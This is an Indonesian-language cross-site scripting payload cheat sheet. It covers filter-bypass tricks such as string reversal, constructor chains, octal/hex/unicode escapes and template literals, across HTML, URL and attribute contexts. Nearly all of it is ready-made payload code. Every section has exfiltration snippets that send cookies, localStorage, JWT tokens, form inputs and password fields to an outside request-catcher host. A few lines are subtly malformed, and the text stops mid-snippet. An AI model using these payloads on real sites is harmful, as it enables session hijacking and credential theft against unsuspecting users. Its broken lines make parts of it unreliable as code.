# Teknik unik pemanggilan alert & exfiltrate data for xss 

---

## 1. String Reversal Technique (.split.reverse.join)

### Teknik: Membalik string untuk bypass keyword detection

#### Basic String Reversal
```javascript
// Membalik 'alert' menjadi 'trela'
x='trela'.split('').reverse().join('');
window[x](1);

// Membalik 'fetch' menjadi 'hctef'
x='hctef'.split('').reverse().join('');
self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie);

// Membalik 'eval' menjadi 'lave'
x='lave'.split('').reverse().join('');
window[x]('alert(document.domain)');
```

#### HTML Context Examples
```html
<!-- Link canonical injection -->
<link rel="canonical" href="x" accesskey="x" onclick="x='trela'.split('').reverse().join('');window[x](document.cookie);" x="">

<!-- Input field -->
<input type="text" value="x" onfocus="x='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie)">

<!-- Image tag -->
<img src=x onerror="x='lave'.split('').reverse().join('');window[x]('alert(1)')">

<!-- SVG element -->
<svg onload="x='trela'.split('').reverse().join('');window[x](origin)">

<!-- Body tag -->
<body onload="x='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/log?data='+btoa(document.cookie))">

<!-- Button -->
<button onclick="x='trela'.split('').reverse().join('');window[x](document.domain)">Click</button>

<!-- Anchor -->
<a href="#" onclick="x='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie)">Link</a>

<!-- Div hover -->
<div onmouseover="x='trela'.split('').reverse().join('');window[x](1)">Hover me</div>
```

#### URL Context Examples
```html
javascript:x='trela'.split('').reverse().join('');window[x](1)
javascript:x='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie)
javascript://example.com/%0Ax='trela'.split('').reverse().join('');window[x](document.domain)//
javascript:%0dx='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie)
javascript:void(x='trela'.split('').reverse().join('');window[x](1))
javascript:/**/x='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie)
```

#### Attribute Context Examples
```html
" autofocus onfocus="x='trela'.split('').reverse().join('');window[x](1)" x="
" onload="x='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie)" x="
' accesskey='x' onclick='x="trela".split("").reverse().join("");window[x](1)' x='
```

#### Advanced: Data Exfiltration
```javascript
// Payload lengkap untuk steal cookie
x='hctef'.split('').reverse().join('');
self[x](
    location.origin.split(location.host)[0] + 
    'kiwoyo.requestcatcher.com/' + 
    '?cookie=' + document.cookie
);

// Dengan error handling
x='hctef'.split('').reverse().join('');
try {
    self[x]('//kiwoyo.requestcatcher.com/?d='+encodeURIComponent(document.cookie))
} catch(e) {
    console.log(e)
}

// Complete data exfiltration
x='hctef'.split('').reverse().join('');
data = {
    cookie: document.cookie,
    domain: document.domain,
    url: location.href,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
};
self[x]('//kiwoyo.requestcatcher.com/?data='+btoa(JSON.stringify(data)));

// Multiple reversed functions
a='hctef'.split('').reverse().join('');  // fetch
b='aotb'.split('').reverse().join('');   // btoa
c='yfirgnitS.NOSJ'.split('').reverse().join(''); // JSON.stringify
payload = {c: document.cookie, d: document.domain};
self[a]('//kiwoyo.requestcatcher.com/?leak='+window[b](window[c](payload)));

// Reverse with POST request
x='hctef'.split('').reverse().join('');
self[x]('//kiwoyo.requestcatcher.com/exfil', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        cookie: document.cookie,
        forms: Array.from(document.forms).map(f => f.action)
    })
});
```

---

## 2. Array Constructor Method Chains

### Teknik: Mengakses Function constructor via Array methods

#### Basic Usage
```javascript
// Basic
[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164(1)')()

// Variasi dengan method lain
[]['map']['constructor']('alert(document.domain)')()
[]['find']['constructor']('alert(document.cookie)')()
[]['reduce']['constructor']('alert(1)')()
[]['forEach']['constructor']('alert(origin)')()
```

#### HTML Context Examples
```html
<!-- Image onerror -->
<img src=x onerror="[]['map']['constructor']('alert(document.domain)')()">

<!-- SVG onload -->
<svg onload="[]['filter']['constructor']('alert(1)')()">

<!-- Input onfocus -->
<input autofocus onfocus="[]['find']['constructor']('alert(document.cookie)')()">

<!-- Button onclick -->
<button onclick="[]['reduce']['constructor']('alert(origin)')()">Click</button>

<!-- Div onmouseover -->
<div onmouseover="[]['forEach']['constructor']('alert(1)')()">Hover me</div>

<!-- Body onload dengan encoding -->
<body onload="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164(1)')()">

<!-- A href javascript protocol -->
<a href="javascript:[]['map']['constructor']('alert(1)')()">Click</a>

<!-- Form onsubmit -->
<form onsubmit="[]['find']['constructor']('alert(document.domain)')();return false">

<!-- Select onchange -->
<select onchange="[]['reduce']['constructor']('alert(1)')()"><option>1</option></select>

<!-- Textarea onfocus -->
<textarea onfocus="[]['forEach']['constructor']('alert(document.cookie)')()"></textarea>
```

#### URL Context Examples
```html
javascript:[]['filter']['constructor']('alert(1)')()
javascript:[]['map']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript://example.com/%0A[]['find']['constructor']('alert(document.domain)')()//
javascript:void([]['reduce']['constructor']('alert(1)')())
javascript:/**/[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164(1)')()
javascript:%0d[]['forEach']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
```

#### Attribute Context Examples
```html
" autofocus onfocus="[]['map']['constructor']('alert(1)')()" x="
" onclick="[]['filter']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
' onmouseover='[][\"find\"][\"constructor\"](\"alert(1)\")()' x='
" onload="[]['\x66ilter']['\x63onstructor']('alert(1)')()" x="
' accesskey='x' onclick='[]["reduce"]["constructor"]("alert(document.domain)")()' x='
" onfocus="[]['forEach']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
```

#### Advanced: Data Exfiltration
```javascript
// Fetch with constructor chain
[]['map']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// Multiple data exfiltration
[]['filter']['constructor'](`
    fetch('//kiwoyo.requestcatcher.com/?'+
        'cookie='+encodeURIComponent(document.cookie)+
        '&domain='+document.domain+
        '&url='+encodeURIComponent(location.href)
    )
`)()

// With btoa encoding
[]['find']['constructor']('fetch("//kiwoyo.requestcatcher.com/?data="+btoa(document.cookie))')()

// Complete payload dengan error handling
[]['reduce']['constructor'](`
    try {
        var data = {
            c: document.cookie,
            d: document.domain,
            u: location.href,
            r: document.referrer
        };
        fetch('//kiwoyo.requestcatcher.com/?leak='+btoa(JSON.stringify(data)));
    } catch(e) { }
`)()

// Octal encoded exfiltration
[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\146\145\164\143\150("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// POST request with form data
[]['forEach']['constructor'](`
    var formData = new FormData();
    formData.append('cookie', document.cookie);
    formData.append('localStorage', JSON.stringify(localStorage));
    fetch('//kiwoyo.requestcatcher.com/post', {
        method: 'POST',
        body: formData
    });
`)()
```

---

## 3. String Constructor Chains

### Teknik: Mengakses constructor via String methods

#### Basic Usage
```javascript
// Via String methods
''['constructor']['constructor']('alert(1)')()
""['sub']['constructor']('alert(document.cookie)')()
``['toString']['constructor']('alert(1)')()

// Dengan encoding
''.constructor.constructor('\141\154\145\162\164(1)')()
```

#### HTML Context Examples
```html
<!-- Image tag -->
<img src=x onerror="''['constructor']['constructor']('alert(1)')()">

<!-- SVG -->
<svg onload='""["sub"]["constructor"]("alert(document.domain)")()'>

<!-- Input -->
<input value=x onfocus="``['toString']['constructor']('alert(1)')()">

<!-- Body -->
<body onload="''.constructor.constructor('alert(document.cookie)')()">

<!-- Anchor -->
<a href="javascript:''['constructor']['constructor']('alert(1)')()">Link</a>

<!-- Button -->
<button onclick='""["sub"]["constructor"]("alert(origin)")()'>Click</button>

<!-- Div -->
<div onmouseover="``['toString']['constructor']('alert(1)')()">Hover</div>

<!-- Form -->
<form onsubmit="''.constructor.constructor('alert(1)')();return false">

<!-- Video -->
<video onloadstart="''['constructor']['constructor']('alert(1)')()">

<!-- Audio -->
<audio onplay='""["sub"]["constructor"]("alert(document.domain)")()'>
```

#### URL Context Examples
```html
javascript://example.com/%0A``['toString']['constructor']('alert(1)')()//
javascript:''['constructor']['constructor']('alert(1)')()
javascript:""['sub']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript:void(''.constructor.constructor('alert(document.domain)')())
javascript:%0d''['constructor']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript:/**/""['sub']['constructor']('alert(1)')()
```

#### Attribute Context Examples
```html
" autofocus onfocus="''['constructor']['constructor']('alert(1)')()" x="
" onclick='""["sub"]["constructor"]("fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)")()' x="
' onmouseover="``['toString']['constructor']('alert(1)')()" x='
" onload="''.constructor.constructor('alert(document.domain)')()" x="
' accesskey='x' onclick='""["sub"]["constructor"]("alert(1)")()' x='
" onfocus="''['constructor']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
```


#### Advanced: Data Exfiltration
```javascript
// Basic fetch
''['constructor']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// With encoding
""['sub']['constructor']('fetch("//kiwoyo.requestcatcher.com/?data="+btoa(document.cookie))')()

// Complete data leak
``['toString']['constructor'](`
    var payload = {
        cookie: document.cookie,
        domain: document.domain,
        localStorage: JSON.stringify(localStorage),
        url: location.href
    };
    fetch('//kiwoyo.requestcatcher.com/?leak='+btoa(JSON.stringify(payload)));
`)()

// Multiple endpoints
''.constructor.constructor(`
    var c = document.cookie;
    fetch('//kiwoyo.requestcatcher.com/cookie?c='+c);
    fetch('//kiwoyo.requestcatcher.com/domain?d='+document.domain);
    fetch('//kiwoyo.requestcatcher.com/url?u='+location.href);
`)()

// With headers
''['constructor']['constructor'](`
    fetch('//kiwoyo.requestcatcher.com/', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            cookie: document.cookie,
            domain: document.domain,
            token: localStorage.getItem('token')
        })
    })
`)()

// Exfiltrate all input values
""['sub']['constructor'](`
    var inputs = Array.from(document.querySelectorAll('input')).map(i => ({
        name: i.name,
        value: i.value,
        type: i.type
    }));
    fetch('//kiwoyo.requestcatcher.com/inputs?data='+btoa(JSON.stringify(inputs)));
`)()
```

---

## 4. Number & Boolean Constructor

### Teknik: Menggunakan primitives lain

#### Basic Usage
```javascript
// Via Number
(1)['constructor']['constructor']('alert(1)')()
(0).constructor.constructor('alert(document.domain)')()

// Via Boolean
true['constructor']['constructor']('alert(1)')()
false.constructor.constructor('alert(document.cookie)')()
```

#### HTML Context Examples
```html
<!-- Image -->
<img src=x onerror="(1)['constructor']['constructor']('alert(1)')()">

<!-- SVG -->
<svg onload="true['constructor']['constructor']('alert(document.domain)')()">

<!-- Input -->
<input autofocus onfocus="(0).constructor.constructor('alert(1)')()">

<!-- Button -->
<button onclick="false.constructor.constructor('alert(origin)')()">Click</button>

<!-- Body -->
<body onload="(1)['constructor']['constructor']('alert(document.cookie)')()">

<!-- Anchor -->
<a href="javascript:true['constructor']['constructor']('alert(1)')()">Link</a>

<!-- Div -->
<div onmouseover="(0).constructor.constructor('alert(1)')()">Hover</div>

<!-- Form -->
<form onsubmit="false.constructor.constructor('alert(1)')();return false">

<!-- Details -->
<details ontoggle="(1)['constructor']['constructor']('alert(1)')()">

<!-- Summary -->
<summary onclick="true['constructor']['constructor']('alert(document.domain)')()">Click</summary>
```

#### URL Context Examples
```html
javascript://example.com/%0A(0).constructor.constructor('alert(1)')()//
javascript:(1)['constructor']['constructor']('alert(1)')()
javascript:true['constructor']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript:void(false.constructor.constructor('alert(document.domain)')())
javascript:%0dtrue['constructor']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript:/**/(1)['constructor']['constructor']('alert(1)')()
```

#### Attribute Context Examples
```html
" autofocus onfocus="(1)['constructor']['constructor']('alert(1)')()" x="
" onclick="true['constructor']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
' onmouseover='(0).constructor.constructor("alert(1)")()' x='
" onload="false.constructor.constructor('alert(document.domain)')()" x="
' accesskey='x' onclick='(1)["constructor"]["constructor"]("alert(1)")()' x='
" onfocus="true['constructor']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
```


#### Advanced: Data Exfiltration
```javascript
// Number constructor exfiltration
(1)['constructor']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// Boolean true
true['constructor']['constructor']('fetch("//kiwoyo.requestcatcher.com/?data="+btoa(document.cookie))')()

// Boolean false with complete data
false.constructor.constructor(`
    var info = {
        cookie: document.cookie,
        domain: document.domain,
        url: location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent
    };
    fetch('//kiwoyo.requestcatcher.com/?leak='+encodeURIComponent(JSON.stringify(info)));
`)()

// Number with POST request
(0).constructor.constructor(`
    fetch('//kiwoyo.requestcatcher.com/steal', {
        method: 'POST',
        body: new URLSearchParams({
            cookie: document.cookie,
            localStorage: JSON.stringify(localStorage)
        })
    })
`)()

// Multiple boolean checks
true['constructor']['constructor'](`
    if(document.cookie) {
        fetch('//kiwoyo.requestcatcher.com/has-cookie?c='+document.cookie);
    }
    if(localStorage.length > 0) {
        fetch('//kiwoyo.requestcatcher.com/has-storage?s='+btoa(JSON.stringify(localStorage)));
    }
`)()

// Exfiltrate credentials from forms
(1)['constructor']['constructor'](`
    var forms = Array.from(document.forms);
    var credentials = forms.map(f => {
        var inputs = Array.from(f.elements).filter(e => e.type === 'password' || e.type === 'email');
        return inputs.map(i => ({name: i.name, value: i.value}));
    });
    fetch('//kiwoyo.requestcatcher.com/creds?data='+btoa(JSON.stringify(credentials)));
`)()
```

---

## 5. RegExp Constructor Method

### Teknik: Via RegExp object

#### Basic Usage
```javascript
/./['constructor']['constructor']('alert(1)')()
/x/.constructor.constructor('alert(document.domain)')()

// Dengan pattern khusus
/[a-z]/.constructor.constructor('\141\154\145\162\164(1)')()
```

#### HTML Context Examples
```html
<!-- Image -->
<img src=x onerror="/./['constructor']['constructor']('alert(1)')()">

<!-- SVG -->
<svg onload="/x/.constructor.constructor('alert(document.domain)')()">

<!-- Input -->
<input autofocus onfocus="/[a-z]/.constructor.constructor('alert(1)')()">

<!-- Button -->
<button onclick="/\d+/.constructor.constructor('alert(origin)')()">Click</button>

<!-- Body -->
<body onload="/./['constructor']['constructor']('alert(document.cookie)')()">

<!-- Anchor -->
<a href="javascript:/x/.constructor.constructor('alert(1)')()">Link</a>

<!-- Div -->
<div onmouseover="/[0-9]/.constructor.constructor('alert(1)')()">Hover</div>

<!-- Form -->
<form onsubmit="/test/.constructor.constructor('alert(1)')();return false">

<!-- Marquee -->
<marquee onstart="/./['constructor']['constructor']('alert(1)')()">Scroll</marquee>

<!-- Iframe -->
<iframe onload="/x/.constructor.constructor('alert(document.domain)')()">
```

#### URL Context Examples
```html
javascript:%0d/test/.constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript:/./['constructor']['constructor']('alert(1)')()
javascript:/x/.constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript://example.com/%0A/[a-z]/.constructor.constructor('alert(1)')()//
javascript:void(/\d+/.constructor.constructor('alert(document.domain)')())
javascript:/**//./['constructor']['constructor']('alert(1)')()
```

#### Attribute Context Examples
```html
" autofocus onfocus="/./['constructor']['constructor']('alert(1)')()" x="
" onclick="/x/.constructor.constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
' onmouseover='/[a-z]/.constructor.constructor("alert(1)")()' x='
" onload="/\d+/.constructor.constructor('alert(document.domain)')()" x="
' accesskey='x' onclick='/test/["constructor"]["constructor"]("alert(1)")()' x='
" onfocus="/./['constructor']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
```


#### Advanced: Data Exfiltration
```javascript
// Basic RegExp exfiltration
/./['constructor']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// With pattern matching
/x/.constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?data="+btoa(document.cookie))')()

// Complex pattern
/[a-zA-Z0-9]/.constructor.constructor(`
    var secrets = {
        cookie: document.cookie,
        domain: document.domain,
        forms: Array.from(document.forms).map(f => ({
            action: f.action,
            method: f.method,
            inputs: Array.from(f.elements).map(i => ({name: i.name, value: i.value}))
        }))
    };
    fetch('//kiwoyo.requestcatcher.com/?leak='+btoa(JSON.stringify(secrets)));
`)()

// Multiple regex patterns
/\w+/.constructor.constructor(`
    fetch('//kiwoyo.requestcatcher.com/cookie?c='+document.cookie);
    fetch('//kiwoyo.requestcatcher.com/storage?s='+btoa(JSON.stringify(localStorage)));
    fetch('//kiwoyo.requestcatcher.com/session?s='+btoa(JSON.stringify(sessionStorage)));
`)()

// With regex test
/test/.constructor.constructor(`
    var data = document.cookie;
    if(data.length > 0) {
        fetch('//kiwoyo.requestcatcher.com/?c='+encodeURIComponent(data));
    }
`)()

// Steal JWT tokens from localStorage
/jwt/.constructor.constructor(`
    var tokens = {};
    for(var i=0; i<localStorage.length; i++) {
        var key = localStorage.key(i);
        if(key.match(/token|jwt|auth|session/i)) {
            tokens[key] = localStorage.getItem(key);
        }
    }
    fetch('//kiwoyo.requestcatcher.com/tokens?data='+btoa(JSON.stringify(tokens)));
`)()
```

---

## 6. Unicode & Hex Escape Sequences

### Teknik: Encoding berbeda

#### Basic Usage
```javascript
// Unicode escape
[]['filter']['constructor']('\u0061\u006c\u0065\u0072\u0074(1)')()

// Hex escape
[]['map']['constructor']('\x61\x6c\x65\x72\x74(1)')()

// Mixed encoding
[]['find']['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']('\u0061lert(1)')()
```

#### HTML Context Examples
```html
<!-- Image with unicode -->
<img src=x onerror="[]['filter']['constructor']('\u0061\u006c\u0065\u0072\u0074(1)')()">

<!-- SVG with hex -->
<svg onload="[]['map']['constructor']('\x61\x6c\x65\x72\x74(1)')()">

<!-- Input with mixed -->
<input autofocus onfocus="[]['find']['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']('\u0061lert(1)')()">

<!-- Button -->
<button onclick="[]['reduce']['constructor']('\x61\x6c\x65\x72\x74(document.domain)')()">Click</button>

<!-- Body with full unicode -->
<body onload="[]['\u0066\u0069\u006c\u0074\u0065\u0072']['\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072']('\u0061\u006c\u0065\u0072\u0074(1)')()">

<!-- Anchor -->
<a href="javascript:[]['map']['constructor']('\x61\x6c\x65\x72\x74(1)')()">Link</a>

<!-- Div -->
<div onmouseover="[]['forEach']['constructor']('\u0061\u006c\u0065\u0072\u0074(1)')()">Hover</div>

<!-- Video -->
<video onloadstart="[]['filter']['constructor']('\x61\x6c\x65\x72\x74(1)')()">

<!-- Canvas -->
<canvas onclick="[]['map']['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']('\u0061\u006c\u0065\u0072\u0074(1)')()">

<!-- Object -->
<object data=x onerror="[]['find']['constructor']('\x61\x6c\x65\x72\x74(document.domain)')()">
```


#### URL Context Examples
```html
javascript://example.com/%0A[]['\u0066ilter']['\x63onstructor']('\u0061lert(1)')()//
javascript:[]['filter']['constructor']('\u0061\u006c\u0065\u0072\u0074(1)')()
javascript:[]['map']['constructor']('\x66\x65\x74\x63\x68("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript:void([]['find']['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']('\x61\x6c\x65\x72\x74(1)')())
javascript:%0d[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164(1)')()
javascript:/**/.['map']['constructor']('\x66\x65\x74\x63\x68("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
```

#### Attribute Context Examples
```html
" autofocus onfocus="[]['filter']['constructor']('\u0061\u006c\u0065\u0072\u0074(1)')()" x="
" onclick="[]['map']['constructor']('\x66\x65\x74\x63\x68(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
' onmouseover='[]["\u0066ind"]["\x63onstructor"]("\u0061lert(1)")()' x='
" onload="[]['\146ilter']['\143onstructor']('\141lert(1)')()" x="
' accesskey='x' onclick='[]["reduce"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]("\x61\x6c\x65\x72\x74(1)")()' x='
" onfocus="[]['map']['constructor']('\x66\x65\x74\x63\x68(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
```


#### Advanced: Data Exfiltration
```javascript
// Unicode encoded fetch
[]['filter']['constructor']('\u0066\u0065\u0074\u0063\u0068("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// Hex encoded exfiltration
[]['map']['constructor']('\x66\x65\x74\x63\x68("//kiwoyo.requestcatcher.com/?data="+btoa(document.cookie))')()

// Mixed encoding complete
[]['find']['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72'](`
    \u0066\u0065\u0074\u0063\u0068('//kiwoyo.requestcatcher.com/?leak='+btoa(JSON.stringify({
        cookie: document.cookie,
        domain: document.domain,
        url: location.href
    })))
`)()

// Full unicode exfiltration
[]['\u0066\u0069\u006c\u0074\u0065\u0072']['\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072'](`
    var payload = {
        cookie: document.cookie,
        localStorage: JSON.stringify(localStorage),
        domain: document.domain
    };
    \u0066\u0065\u0074\u0063\u0068('//kiwoyo.requestcatcher.com/?data='+encodeURIComponent(JSON.stringify(payload)));
`)()

// Hex encoded POST
[]['reduce']['constructor'](`
    \x66\x65\x74\x63\x68('//kiwoyo.requestcatcher.com/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            cookie: document.cookie,
            tokens: {
                csrf: document.querySelector('[name=csrf]')?.value,
                jwt: localStorage.getItem('jwt')
            }
        })
    })
`)()

// Octal + Unicode + Hex combo
[]['\146\x69\u006c\x74\145\x72']['\x63\u006f\156\x73\164\x72\x75\143\164\x6f\162']('\x66\u0065\164\x63\150("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
```

---

## 7. Template Literals & Tagged Templates

### Teknik: Menggunakan backtick

#### Basic Usage
```javascript
// Basic template literal
[]['filter']['constructor'](`alert(1)`)()

// Tagged template
(alert)`1`
(alert)`${document.domain}`

// Via constructor
[]['map']['constructor']`return alert(1)`()
```

#### HTML Context Examples
```html
<!-- Image -->
<img src=x onerror="[]['filter']['constructor'](`alert(1)`)()">

<!-- SVG -->
<svg onload="(alert)`${document.domain}`">

<!-- Input -->
<input autofocus onfocus="[]['map']['constructor']`return alert(1)`()">

<!-- Button -->
<button onclick="(alert)`${origin}`">Click</button>

<!-- Body -->
<body onload="[]['find']['constructor'](`alert(document.cookie)`)()">

<!-- Anchor -->
<a href="javascript:[]['reduce']['constructor']`return alert(1)`()">Link</a>

<!-- Div -->
<div onmouseover="(alert)`XSS`">Hover</div>

<!-- Form -->
<form onsubmit="[]['filter']['constructor'](`alert(1)`)();return false">

<!-- Details -->
<details ontoggle="[]['map']['constructor']`return alert(document.domain)`()">

<!-- Select -->
<select onchange="(alert)`${document.cookie}`"><option>1</option></select>
```

#### URL Context Examples
```html
javascript:[]['filter']['constructor'](`alert(1)`)()
javascript:[]['map']['constructor'](`fetch('//kiwoyo.requestcatcher.com/?c='+document.cookie)`)()
javascript://example.com/%0A[]['find']['constructor']`return alert(1)`()//
javascript:void([]['reduce']['constructor'](`alert(document.domain)`)())
javascript:%0d[]['forEach']['constructor'](`fetch('//kiwoyo.requestcatcher.com/?c='+document.cookie)`)()
javascript:/**/.['filter']['constructor'](`alert(1)`)()
```

#### Attribute Context Examples
```html
" autofocus onfocus="[]['filter']['constructor'](`alert(1)`)()" x="
" onclick="[]['map']['constructor'](`fetch('//kiwoyo.requestcatcher.com/?c='+document.cookie)`)()" x="
' onmouseover='[][&quot;find&quot;][&quot;constructor&quot;]`return alert(1)`()' x='
" onload="[]['reduce']['constructor'](`alert(document.domain)`)()" x="
' accesskey='x' onclick='[]["forEach"]["constructor"]`return alert(1)`()' x='
" onfocus="[]['map']['constructor'](`fetch('//kiwoyo.requestcatcher.com/?leak='+btoa(document.cookie))`)()" autofocus x="
```


#### Advanced: Data Exfiltration
```javascript
// Template literal fetch
[]['filter']['constructor'](`fetch('//kiwoyo.requestcatcher.com/?c='+document.cookie)`)()

// Tagged template with interpolation
[]['map']['constructor'](`
    fetch(\`//kiwoyo.requestcatcher.com/?cookie=\${document.cookie}&domain=\${document.domain}\`)
`)()

// Complete template exfiltration
[]['find']['constructor'](`
    const data = {
        cookie: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url: location.href,
        referrer: document.referrer
    };
    fetch(\`//kiwoyo.requestcatcher.com/?leak=\${btoa(JSON.stringify(data))}\`);
`)()

// Multiple template requests
[]['reduce']['constructor'](`
    fetch(\`//kiwoyo.requestcatcher.com/step1?c=\${document.cookie}\`);
    fetch(\`//kiwoyo.requestcatcher.com/step2?d=\${document.domain}\`);
    fetch(\`//kiwoyo.requestcatcher.com/step3?u=\${location.href}\`);
`)()

// Template with POST
[]['forEach']['constructor'](`
    fetch('//kiwoyo.requestcatcher.com/exfil', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            cookie: document.cookie,
            forms: Array.from(document.forms).map(f => ({
                action: f.action,
                inputs: Array.from(f.elements).map(e => ({
                    name: e.name,
                    value: e.value
                }))
            }))
        })
    })
`)()

// Nested template literals
[]['map']['constructor'](`
    const exfil = \`//kiwoyo.requestcatcher.com/?\${new URLSearchParams({
        cookie: document.cookie,
        domain: document.domain,
        storage: btoa(JSON.stringify(localStorage))
    })}\`;
    fetch(exfil);
`)()
```

---

## 8. Object Property Access Variations

### Teknik: Berbagai cara akses property

#### Basic Usage
```javascript
// Dot notation
[].filter.constructor('alert(1)')()

// Bracket notation
[]]['filter']['constructor']('alert(1)')()

// Computed property
const a='filter',b='constructor';[][ a][b]('alert(1)')()

// With variables (jika bisa inject JS)
with([]){filter.constructor('alert(1)')()}
```

#### HTML Context Examples
```html
<!-- Image dot notation -->
<img src=x onerror="[].filter.constructor('alert(1)')()">

<!-- SVG bracket notation -->
<svg onload="[]['filter']['constructor']('alert(document.domain)')()">

<!-- Input computed property -->
<input autofocus onfocus="(a='filter',b='constructor',[][a][b]('alert(1)')())">

<!-- Button with statement -->
<button onclick="with([]){filter.constructor('alert(origin)')()}">Click</button>

<!-- Body mixed access -->
<body onload="[]['filter'].constructor('alert(document.cookie)')()">

<!-- Anchor -->
<a href="javascript:[].map.constructor('alert(1)')()">Link</a>

<!-- Div -->
<div onmouseover="[].find.constructor('alert(1)')()">Hover</div>

<!-- Form -->
<form onsubmit="[].reduce.constructor('alert(1)')();return false">

<!-- Table -->
<table onclick="[]['forEach'].constructor('alert(document.domain)')()">

<!-- Details -->
<details ontoggle="[].filter.constructor('alert(1)')()">
```

#### URL Context Examples
```html
javascript:[].filter.constructor('alert(1)')()
javascript:[].map.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript://example.com/%0A[].find.constructor('alert(1)')()//
javascript:void([].reduce.constructor('alert(document.domain)')())
javascript:%0d[].forEach.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript:/**/.filter.constructor('alert(1)')()
```

#### Attribute Context Examples
```html
" autofocus onfocus="[].filter.constructor('alert(1)')()" x="
" onclick="[].map.constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
' onmouseover='[].find.constructor("alert(1)")()' x='
" onload="[].reduce.constructor('alert(document.domain)')()" x="
' accesskey='x' onclick='[].forEach.constructor("alert(1)")()' x='
" onfocus="[].map.constructor('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
```


#### Advanced: Data Exfiltration
```javascript
// Dot notation exfiltration
[].map.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// Bracket notation with data
[]['filter']['constructor']('fetch("//kiwoyo.requestcatcher.com/?data="+btoa(document.cookie))')()

// Computed property exfiltration
const m='map',c='constructor';
[][m][c](`
    fetch('//kiwoyo.requestcatcher.com/?leak='+btoa(JSON.stringify({
        cookie: document.cookie,
        domain: document.domain,
        url: location.href
    })))
`)()

// With statement exfiltration
with([]){
    filter.constructor(`
        var payload = {
            cookie: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage)
        };
        fetch('//kiwoyo.requestcatcher.com/?data='+encodeURIComponent(JSON.stringify(payload)));
    `)()
}

// Dynamic property access
var props = ['filter', 'constructor'];
